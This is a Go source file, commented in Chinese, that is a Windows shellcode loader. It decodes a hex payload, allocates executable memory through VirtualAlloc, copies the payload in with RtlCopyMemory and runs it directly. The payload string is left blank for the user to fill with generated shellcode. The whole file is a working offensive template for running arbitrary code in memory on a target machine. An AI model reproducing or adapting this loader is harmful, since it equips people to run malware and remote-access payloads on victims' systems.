package main

import (
	"encoding/hex"
	"os"
	"syscall"
	"unsafe"
)

const (
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	PAGE_EXECUTE_READWRITE = 0x40
)

var (
	kernel32      = syscall.MustLoadDLL("kernel32.dll")   //调用kernel32.dll
	ntdll         = syscall.MustLoadDLL("ntdll.dll")      //调用ntdll.dll
	VirtualAlloc  = kernel32.MustFindProc("VirtualAlloc") //使用kernel32.dll调用ViretualAlloc函数
	RtlCopyMemory = ntdll.MustFindProc("RtlCopyMemory")   //使用ntdll调用RtCopyMemory函数
	// 生成C类型的shellcode，转换成hex值
	shellcode_hex = ""
)

func checkErr(err error) {
	if err != nil { //如果内存调用出现错误，可以报出
		if err.Error() != "The operation completed successfully." { //如果调用dll系统发出警告，但是程序运行成功，则不进行警报
			println(err.Error()) //报出具体错误
			os.Exit(1)
		}
	}
}

func main() {
	// _ 匿名变量
	shellcode, _ := hex.DecodeString(shellcode_hex)
	//调用VirtualAlloc为shellcode申请一块内存
	addr, _, err := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
	if addr == 0 {
		checkErr(err)
	}

	//调用RtlCopyMemory来将shellcode加载进内存当中
	_, _, err = RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
	checkErr(err)

	//syscall来运行shellcode
	syscall.Syscall(addr, 0, 0, 0, 0)
}
